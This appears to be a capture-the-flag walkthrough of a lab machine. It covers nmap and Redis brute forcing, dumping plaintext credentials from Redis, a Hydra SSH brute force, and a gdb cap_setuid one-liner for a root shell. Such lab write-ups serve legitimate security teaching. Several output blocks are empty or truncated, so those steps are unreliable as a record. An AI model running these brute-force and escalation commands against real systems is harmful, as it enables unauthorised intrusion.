# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

## Result

```text
$ sudo arp-scan  --localnet

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sSV -p- --min-rate 5000 192.168.29.3
```

## Scan Results

```bash
$ nmap -n -Pn -sVS  -p- --min-rate 5000  192.168.29.3

```

### Findings
- Port **22** → SSH
- Port **6379** → Redis Server

The Redis service appeared particularly interesting and potentially vulnerable.

---

# 🔐 Redis Enumeration

Attempt to retrieve Redis server information:

```bash
redis-cli -h 192.168.29.3 INFO
```

## Result

```text
$ redis-cli -h 192.168.29.3 INFO
NOAUTH Authentication required.
```

The Redis server requires authentication.

---

# 🔓 Redis Password Brute Force

Use Nmap using the `redis-brute` to brute-force the Redis password:

```bash
nmap -p 6379 --script redis-brute 192.168.29.3
```

## Result

```text
$ nmap -p 6379 --script redis-brute 192.168.29.3

Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 01:14 -0700

# 🔍 Redis Key Enumeration

Use the password to enumerate Redis keys:

```bash
redis-cli -h 192.168.29.3 -a hellow KEYS '*'
```

## Result

```text
$ redis-cli -h 192.168.29.3 -a hellow KEYS '*'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
1) "key5"
2) "key1"
3) "key4"
4) "key2"
5) "key3"
```

---

# 📄 Retrieving Stored Data

Retrieve all key values using `MGET`:

```bash
redis-cli -h 192.168.29.3 -a hellow \
MGET key1 key2 key3 key4 key5
```

## Result

```text
$ redis-cli -h 192.168.29.3 -a hellow MGET key1 key2 key3 key4 key5
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
1) "killer:K!ll3R123"
2) "ghost:Ghost!Hunter42"
3) "snake:Pixel_Sn4ke77"
4) "wolf:CyberWolf#21"
5) "shadow:ShadowMaze@9"
```

### Important Finding
The Redis database contained usernames and passwords.

# 🔓 SSH Brute Force

Use Hydra against SSH:

```bash
hydra -L users.txt -P pass.txt ssh://192.168.29.3 
```

## Result

```text
$ hydra -L users.txt -P pass.txt ssh://192.168.29.3 -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

### Valid Credentials

```text
Username: killer
Password: ShadowMaze@9
```

---

# 🖥 Initial Access and verife

Login through SSH:

```bash
$ ssh killer@192.168.29.3
killer@192.168.29.3's password: 
killer@lower6:~$ id ; whoami
uid=1000(killer) gid=1000(killer) grupos=1000(killer)
killer
```

Successfully gained access as user `killer`.

---

# ⚠️ Sudo Enumeration

Attempt to use `sudo`:

```bash
sudo -l
```

## Result

```text
killer@lower6:~$ sudo -l
-bash: sudo: orden no encontrada
```

The `sudo` command is not available on the system.

---

# 🔍 Linux Capabilities Enumeration

Enumerate binaries with Linux capabilities using `getcap`:

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

## Result

```text
killer@lower6:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
```

### Important Finding
The `gdb` binary has the capability:

```text
cap_setuid=ep
```

This capability allows privilege escalation to root.

---

# 🚀 Privilege Escalation via GDB

Use the [GTFOBins](https://gtfobins.org/gtfobins/gdb/#shell) technique to obtain a root shell:

```bash
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```

## Result

```text

```

---

# 👑 Verification

Check privileges:

```bash
id ; whoami
```

## Result

```bash
root@lower6:~# id ; whoami
uid=0(root) gid=1000(killer) grupos=1000(killer)
root
```

Successfully escalated privileges to root.

# 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| Service Enumeration | Redis |
| Credential Attack | Nmap |
| Credential Disclosure | Redis Keys |
| Initial Access | SSH |
| Privilege Escalation | Linux Capabilities |
| Root Access | GDB Exploitation |

---

# 🚀 Key Takeaways

- Redis databases may expose sensitive credentials if improperly secured.
- Password reuse can lead to full system compromise.
- Linux capabilities can be as dangerous as SUID binaries.
- `gdb` with `cap_setuid` can directly provide root access.
- Always enumerate capabilities during privilege escalation.
